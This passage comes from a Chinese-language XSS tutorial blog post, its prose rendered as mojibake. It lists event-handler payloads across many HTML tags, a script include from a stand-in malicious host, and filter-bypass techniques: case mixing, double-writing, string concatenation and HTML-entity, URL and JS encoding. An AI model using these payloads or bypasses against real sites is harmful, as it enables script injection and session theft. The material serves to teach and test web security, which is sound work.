autofocus&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445437.png" alt="image-20240429235853943"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445438.png" alt="image-20240429235920732"></p><p><strong><details></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>è¯¥æ ‡ç­¾ç”¨äºå±•ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œå½“æ”¶èµ·æˆ–å±•å¼€æ—¶å°±ä¼šå¼¹å‡ºxss<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445439.png" alt="image-20240430000454901"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ä½¿ç”¨openå±æ€§è§¦å‘ontoggleäº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘ï¼Œå°±æ˜¯åœ¨è¿›å…¥é¡µé¢æ—¶è‡ªåŠ¨å¸®ä½ å±•å¼€ä¸€æ¬¡è¯¦æƒ…<br>&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong><svg></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;svg onload=alert(&quot;xss&quot;);&gt;<br><br>SVGï¼ˆScalable Vector Graphicsï¼Œå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼‰å…ƒç´ ï¼›<br>onload äº‹ä»¶å±æ€§åœ¨ SVG å…ƒç´ åŠ è½½å®Œæˆåè§¦å‘ï¼Œç±»ä¼¼äº HTML ä¸­çš„ &lt;img&gt; æ ‡ç­¾çš„ onload äº‹ä»¶ã€‚<br></code></pre></td></tr></table></figure><p><strong><select></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;<br>&lt;select&gt; æ˜¯ HTML ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œç”¨äºåˆ›å»ºä¸‹æ‹‰åˆ—è¡¨ã€‚ç”¨æˆ·å¯ä»¥ä»åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªé€‰é¡¹ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445440.png" alt="image-20240430000930281"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘<br>&lt;select onfocus=alert(1) autofocus&gt;<br></code></pre></td></tr></table></figure><p><strong><iframe></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br>&lt;iframe&gt; æ˜¯ HTML ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œç”¨äºåœ¨å½“å‰é¡µé¢å†…åµŒå…¥å¦ä¸€ä¸ª HTML é¡µé¢ã€‚onload äº‹ä»¶å±æ€§æŒ‡å®šäº†å½“ &lt;iframe&gt; å®ŒæˆåŠ è½½è¿‡ç¨‹æ—¶åº”è¯¥æ‰§è¡Œçš„ JavaScript ä»£ç ã€‚<br></code></pre></td></tr></table></figure><p><strong><video></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;<br>è·Ÿimageå·®ä¸å¤šï¼Œè¯¥æ ‡ç­¾ç”¨äºåµŒå…¥è§†é¢‘å†…å®¹ï¼Œæ²¡æœ‰åŠ è½½è§†é¢‘æ—¶å°±æ‰§è¡Œonerror<br></code></pre></td></tr></table></figure><p><strong><audio></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;<br>è¿™ä¸ªæ ‡ç­¾ç”¨äºåµŒå…¥éŸ³é¢‘å†…å®¹<br></code></pre></td></tr></table></figure><p><strong><body></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body/onload=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body<br>onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;<br>//onscroll æ˜¯ä¸€ä¸ªå†…è”äº‹ä»¶å¤„ç†å™¨ï¼Œå®ƒåœ¨ç”¨æˆ·æ»šåŠ¨é¡µé¢æ—¶è§¦å‘ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨å¤šä¸ªæ¢è¡Œç¬¦è‡ªåŠ¨è¿½ç„¦åˆ°è¾“å…¥æ¡†é€ æˆæ»šåŠ¨æ•ˆæœ<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ¢è¡Œç¬¦ä»¥åŠautofocusï¼Œè‡ªåŠ¨å»è§¦å‘onscrolläº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</p><p><strong><textarea></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;<br></code></pre></td></tr></table></figure><p><strong><keygen></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //ä»…é™ç«ç‹<br></code></pre></td></tr></table></figure><p><strong><marquee></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥<br></code></pre></td></tr></table></figure><p><strong><isindex></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//ä»…é™äºIE<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶"><a href="#åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶"></a>åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶</h1><p>è¯¥æ ‡ç­¾åœ¨æ— CSPçš„æƒ…å†µä¸‹å¯ä»¥è¿œç¨‹åŒ…å«jsæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;<br></code></pre></td></tr></table></figure><h1 id="XSS-Bypass"><a href="#XSS-Bypass" class="headerlink" title="XSS Bypass"></a>XSS Bypass</h1><h2 id="åˆ©ç”¨htmlå±æ€§ç»•è¿‡"><a href="#åˆ©ç”¨htmlå±æ€§ç»•è¿‡" class="headerlink" title="åˆ©ç”¨htmlå±æ€§ç»•è¿‡"></a>åˆ©ç”¨htmlå±æ€§ç»•è¿‡</h2><p>å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸åŒçš„å±æ€§å»å°è¯•ä¸€ä¸‹ï¼š</p><ol><li><code>href</code>ï¼šç”¨äºå®šä¹‰è¶…é“¾æ¥çš„ç›®çš„åœ°ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å…¶ä¸­åµŒå…¥JavaScriptä»£ç ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click me&lt;/a&gt;</code></li></ul></li><li><code>src</code>ï¼šé€šå¸¸ç”¨äº<code>&lt;script&gt;</code>ã€<code>&lt;img&gt;</code>ã€<code>&lt;iframe&gt;</code>ç­‰æ ‡ç­¾ï¼ŒæŒ‡å®šå¤–éƒ¨èµ„æºçš„è·¯å¾„ï¼Œå¯èƒ½ä¼šè¢«ç”¨æ¥åŠ è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;script src=&quot;http://malicious.com/xss.js&quot;&gt;&lt;/script&gt;</code></li></ul></li><li><code>onclick</code>ã€<code>onerror</code>ã€<code>onmouseover</code>ã€<code>onmouseout</code>ã€<code>onload</code>ï¼šè¿™äº›äº‹ä»¶å±æ€§å¯ä»¥è§¦å‘JavaScriptä»£ç çš„æ‰§è¡Œã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot; /&gt;</code></li></ul></li><li><code>style</code>ï¼šå¯ä»¥åŒ…å«CSSæ ·å¼ï¼Œä½†ä¹Ÿå¯èƒ½é€šè¿‡CSSè¡¨è¾¾å¼æ¥æ‰§è¡ŒJavaScriptã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;div style=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></li></ul></li><li><code>value</code>ï¼šè¡¨å•å…ƒç´ çš„å€¼ï¼Œå¦‚æœå¤„ç†ä¸å½“ï¼Œä¹Ÿå¯èƒ½æˆä¸ºXSSæ”»å‡»çš„é€”å¾„ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;input type=&quot;text&quot; value=&quot;</code>alert('XSS')<code>&quot; onfocus=&quot;eval(this.value)&quot;&gt;</code></li></ul></li><li><code>data</code>ï¼šæŸäº›ç°ä»£æµè§ˆå™¨æ”¯æŒ<code>data:</code>åè®®ï¼Œå…è®¸åœ¨HTMLä¸­ç›´æ¥åµŒå…¥æ•°æ®ï¼Œè¿™ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚<ul><li>ä¾‹å¦‚ï¼š<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgp&quot;&gt;&lt;/object&gt;</code></li></ul></li><li><code>background</code>ï¼šä¸<code>&lt;img&gt;</code>æ ‡ç­¾çš„<code>src</code>ç±»ä¼¼ï¼Œ<code>&lt;body&gt;</code>æ ‡ç­¾çš„<code>background</code>å±æ€§ä¹Ÿå¯èƒ½è¢«ç”¨äºXSSæ”»å‡»ã€‚</li><li><code>action</code>ï¼šåœ¨<code>&lt;form&gt;</code>æ ‡ç­¾ä¸­å®šä¹‰è¡¨å•æäº¤çš„URLï¼Œå¦‚æœå…è®¸ç”¨æˆ·è¾“å…¥ï¼Œå¯èƒ½ä¼šè¢«ç”¨æ¥æ‰§è¡ŒXSSæ”»å‡»ã€‚</li><li><code>dynsrc</code>ï¼šä¸<code>&lt;embed&gt;</code>å’Œ<code>&lt;object&gt;</code>æ ‡ç­¾ç›¸å…³ï¼Œç”¨äºæŒ‡å®šåŠ¨æ€åŠ è½½çš„åª’ä½“èµ„æºï¼Œä¹Ÿå¯èƒ½è¢«ç”¨äºåŠ è½½æ¶æ„è„šæœ¬ã€‚</li></ol><h2 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxxxx?q=&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;<br></code></pre></td></tr></table></figure><h2 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h2><p>æœ‰äº›wafä¼šå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œè¿™æ—¶å€™å°±å¯ä»¥åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><h2 id="æ‹¼æ¥ç»•è¿‡"><a href="#æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ‹¼æ¥ç»•è¿‡"></a>æ‹¼æ¥ç»•è¿‡</h2><p>æ‹¼æ¥ç»•è¿‡çš„æ€è·¯å°±æ˜¯åˆ©ç”¨ä¸€äº›å…³é”®å­—èƒ½å¤Ÿæ‹¿åˆ°å‡½æ•°åæˆ–è€…åˆ©ç”¨evalèƒ½å¤Ÿå°†å­—ç¬¦ä¸²å½“ä½œjsä»£ç æ‰§è¡Œã€‚</p><p><strong>eval</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>top</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>top</code> æ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œé€šå¸¸ç”¨äºå¼•ç”¨æµè§ˆå™¨çª—å£çš„é¡¶å±‚æ¡†æ¶ï¼ˆframeï¼‰ã€‚</p><p><code>top</code> æ˜¯ç”¨æ¥ç¡®ä¿è¿™æ®µä»£ç èƒ½åœ¨å½“å‰é¡µé¢çš„é¡¶å±‚çª—å£æ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨æŸä¸ªåµŒå¥—çš„æ¡†æ¶æˆ–iframeä¸­æ‰§è¡Œã€‚è¿™æ ·åšå¯ä»¥ç¡®ä¿æ”»å‡»è€…èƒ½å¤Ÿçªç ´æ¡†æ¶çš„å®‰å…¨é™åˆ¶ï¼Œç›´æ¥å¯¹é¡¶å±‚æµè§ˆå™¨çª—å£è¿›è¡Œæ“ä½œã€‚</p><p><strong>window</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>window</code> å¯¹è±¡ä»£è¡¨å½“å‰æµè§ˆå™¨çª—å£çš„ä¸€ä¸ªå®ä¾‹ã€‚å®ƒæ˜¯å…¨å±€å¯¹è±¡ï¼Œæ„å‘³ç€åœ¨æµè§ˆå™¨çš„å…¨å±€ä½œç”¨åŸŸå†…å®šä¹‰çš„ä»»ä½•å˜é‡æˆ–å‡½æ•°éƒ½éšå¼åœ°ä½œä¸º<code>window</code>å¯¹è±¡çš„å±æ€§ã€‚</p><p>é€šè¿‡ä½¿ç”¨æ–¹æ‹¬å·è¡¨ç¤ºæ³• <code>window[&#39;al&#39;+&#39;ert&#39;]</code>ï¼Œä»£ç åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°æ„å»ºäº†å­—ç¬¦ä¸²<code>&#39;alert&#39;</code>ï¼Œç„¶åä½œä¸ºå±æ€§åå»è®¿é—®<code>window</code>å¯¹è±¡ä¸Šçš„<code>alert</code>å‡½æ•°ã€‚</p><p><strong>self</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>self</code> æ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒå¼•ç”¨å½“å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œå³å…¨å±€ä¸Šä¸‹æ–‡ã€‚åœ¨æ™®é€šçš„æµè§ˆå™¨ç¯å¢ƒä¸­ï¼Œ<code>self</code> é€šå¸¸ä¸ <code>window</code> å¯¹è±¡æ˜¯ç­‰ä»·çš„ï¼Œå› ä¸ºæµè§ˆå™¨ä¸­çš„å…¨å±€ä¸Šä¸‹æ–‡å°±æ˜¯ <code>window</code> å¯¹è±¡ã€‚</p><p><strong>parent</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>parent</code> å…³é”®å­—è¢«ç”¨äºå¼•ç”¨å½“å‰æ–‡æ¡£çš„çˆ¶çº§çª—å£æˆ–æ¡†æ¶ã€‚åœ¨HTMLé¡µé¢ä¸­ï¼Œå¦‚æœå­˜åœ¨iframeæˆ–frameï¼Œæ¯ä¸ªæ¡†æ¶éƒ½æœ‰è‡ªå·±çš„ <code>window</code> å¯¹è±¡ï¼Œè€Œ <code>parent</code> å¯¹è±¡æä¾›äº†ä¸€ç§æ–¹å¼æ¥å¼•ç”¨è¿™äº›ä¸åŒå±‚çº§çš„å¯¹è±¡ã€‚</p><p><code>parent</code> å¯¹è±¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å…¨å±€å¯¹è±¡ï¼Œå®ƒæŒ‡å‘å«æœ‰å½“å‰æ‰§è¡Œä»£ç çš„çª—å£æˆ–æ¡†æ¶çš„ç›´æ¥çˆ¶çº§ã€‚å¦‚æœå½“å‰æ‰§è¡Œä»£ç çš„çª—å£æ˜¯é¡¶å±‚çª—å£ï¼Œé‚£ä¹ˆ <code>parent</code> å’Œ <code>window</code> æ˜¯ç›¸åŒçš„ã€‚å¦‚æœä»£ç è¿è¡Œåœ¨ä¸€ä¸ªæ¡†æ¶ä¸­ï¼Œ<code>parent</code> å°†æŒ‡å‘åŒ…å«è¯¥æ¡†æ¶çš„çª—å£ã€‚</p><p><strong>frames</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>frames</code> å…³é”®å­—è¢«ç”¨äºå¼•ç”¨æµè§ˆå™¨çª—å£ä¸­çš„æ‰€æœ‰æ¡†æ¶ï¼ˆframesï¼‰å’Œiframeå…ƒç´ ã€‚åœ¨HTMLä¸­ï¼Œ<code>&lt;frameset&gt;</code> æˆ– <code>&lt;iframe&gt;</code> å…ƒç´ å¯ä»¥è¢«ç”¨æ¥åˆ›å»ºæ¡†æ¶ï¼Œè¿™äº›æ¡†æ¶å¯ä»¥åŒ…å«å…¶ä»–ç½‘é¡µï¼Œæ¯ä¸ªç½‘é¡µéƒ½æœ‰å…¶ç‹¬ç«‹çš„æ–‡æ¡£å’Œçª—å£å¯¹è±¡ã€‚</p><h2 id="å‡½æ•°æ›¿æ¢"><a href="#å‡½æ•°æ›¿æ¢" class="headerlink" title="å‡½æ•°æ›¿æ¢"></a>å‡½æ•°æ›¿æ¢</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;<br></code></pre></td></tr></table></figure><p>è¿™äº›å‡½æ•°åœ¨å…¶ä»–æ ‡ç­¾ä¹Ÿå¯ä»¥ä½¿ç”¨</p><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p>ä¹Ÿå°±æ˜¯åˆ©ç”¨å„ç§å®ä½“ç¼–ç æˆ–è€…å®ä½“åç§°ç»•è¿‡</p><p>htmlå®ä½“ç¼–ç ä¹Ÿå°±æ˜¯è½¬ä¹‰ä¸€äº›åœ¨htmlä¸­æœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦ï¼Œæ¯”å¦‚<ã€>ä¹‹ç±»çš„</p><table><thead><tr><th>æ˜¾ç¤ºç»“æœ</th><th>æè¿°</th><th>å®ä½“åç§°</th><th>åè¿›åˆ¶å®ä½“ç¼–ç </th><th>åå…­è¿›åˆ¶å®ä½“ç¼–ç </th></tr></thead><tbody><tr><td></td><td>ç©ºæ ¼</td><td>&amp;nbsp;</td><td>&amp;#160;</td><td>&amp;#x20;</td></tr><tr><td><</td><td>å°äºå·</td><td>&amp;lt;</td><td>&amp;#60;</td><td>&amp;#x3c;</td></tr><tr><td>></td><td>å¤§äºå·</td><td>&amp;gt;</td><td>&amp;#62;</td><td>&amp;#x3e;</td></tr><tr><td>"</td><td>åŒå¼•å·</td><td>&amp;quot;</td><td>&amp;#34;</td><td>&amp;#x22;</td></tr><tr><td>+</td><td>åŠ å·</td><td>&amp;plus;</td><td>&amp;#43;</td><td>&amp;#x2B;</td></tr></tbody></table><blockquote><p> HTML ä¸­çš„å¸¸ç”¨å­—ç¬¦å®ä½“æ˜¯ä¸é—´æ–­ç©ºæ ¼ã€‚</p><p>ï¼ˆæ³¨æ„ï¼šå®ä½“åç§°å¯¹å¤§å°å†™æ•æ„Ÿï¼ï¼‰ </p><p>å­—ç¬¦å®ä½“ç±»ä¼¼è¿™æ ·ï¼š&entity_name; æˆ–è€… &#entity_number;</p></blockquote><p>æ¯”å¦‚å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;aaa&lt;/a&gt;<br>//ä¸‹é¢æ˜¯ä¸å¸¦åˆ†å·çš„å†™æ³•<br>&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;<br>//è¿˜å¯ä»¥å¡«å……0<br>&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡ºæ¥å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„å®ä½“ç¼–ç å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æŸ¥æ‰¾ï¼š<a href="https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061">https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061</a></p><p><strong>è¿˜å¯ä»¥urlç¼–ç </strong></p><p>å½“æ³¨å…¥ç‚¹å­˜åœ¨hrefæˆ–è€…srcæ—¶å¯ä»¥ä½¿ç”¨urlç¼–ç ï¼Œä½†æ˜¯ç¼–ç æ—¶ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•æ“ä½œ</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;<br>//urlç¼–ç <br>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;<br>//å¯ä»¥äºŒæ¬¡ç¼–ç <br>&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p><strong>jsç¼–ç </strong></p><p>jsç¼–ç è§£æçš„æ—¶å€™å­—ç¬¦æˆ–è€…å­—ç¬¦ä¸²ä»…ä¼šè¢«è§£ç ä¸ºå­—ç¬¦ä¸²æ–‡æœ¬æˆ–è€…æ ‡è¯†ç¬¦åç§°ï¼Œä¾‹å¦‚ js è§£æå™¨å·¥ä½œçš„æ—¶å€™å°†<code>\u0061\u006c\u0065\u0072\u0074</code>è¿›è¡Œè§£ç åä¸º<code>alert</code>ï¼Œè€Œ<code>alert</code>æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ ‡è¯†ç¬¦åç§°ï¼Œå®ƒæ˜¯èƒ½è¢«æ­£å¸¸è§£æçš„ã€‚ä½†æ˜¯åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·ç­‰ç­‰è¿™äº›å­—ç¬¦å°±åªèƒ½è¢«å½“ä½œæ™®é€šçš„æ–‡æœ¬ï¼Œä»è€Œå¯¼è‡´æ— æ³•æ‰§è¡Œã€‚</p><p>ç”±äº js æ˜¯æœ€åè¿›è¡Œè§£æçš„ï¼Œæ‰€ä»¥å¦‚æœæ··åˆç¼–ç ï¼Œéœ€è¦å…ˆä½¿ç”¨ js ç¼–ç å†è¿›è¡Œ url ç¼–ç æˆ–è€… html å®ä½“ç¼–ç ã€‚</p><p>jsç¼–ç ç­–ç•¥ï¼š</p><ol><li>"&quot; åŠ ä¸Šä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸ªæ•°ä¸å¤Ÿï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ "<" ç¼–ç ä¸º "\074"</li><li>"\x" åŠ ä¸Šä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸ªæ•°ä¸å¤Ÿï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ "<" ç¼–ç ä¸º "\x3c"</li><li>"\u" åŠ ä¸Šå››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸ªæ•°ä¸å¤Ÿï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ "<" ç¼–ç ä¸º "\u003c"</li><li>å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„ C ç±»å‹çš„è½¬ä¹‰é£æ 